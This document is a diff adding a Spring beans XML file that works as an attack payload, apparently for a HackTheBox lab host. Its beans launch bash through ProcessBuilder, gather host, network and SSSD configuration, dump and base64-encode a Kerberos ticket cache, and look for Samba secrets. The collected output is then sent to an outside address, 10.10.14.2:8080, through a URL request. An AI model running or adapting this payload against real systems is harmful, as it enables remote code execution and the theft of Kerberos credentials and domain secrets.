@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[echo "=KDCINFO="; cat /var/lib/sss/pubconf/kdcinfo.KING.HTB; echo "=KRB5_INCLUDE="; cat /var/lib/sss/pubconf/krb5.include.d/*; echo "=HOSTS="; cat /etc/hosts; echo "=RESOLV="; cat /etc/resolv.conf; echo "=INTERFACES="; ip addr; ip route; echo "=KLIST="; KRB5CCNAME=/tmp/krb5cc_1600801117_Qxs0zd klist -v 2>&1; echo "=TICKET_B64="; base64 /tmp/krb5cc_1600801117_Qxs0zd; echo "=SSSD_CONF_FIND="; find /etc -name "sssd*" -o -name "sssd.conf" 2>/dev/null; find /etc/sssd -type f 2>/dev/null; echo "=NET_CONF="; cat /etc/network/interfaces 2>/dev/null; echo "=SAMBA_SECRETS="; find /var/lib/samba -name "secrets*" 2>/dev/null]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/dc?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
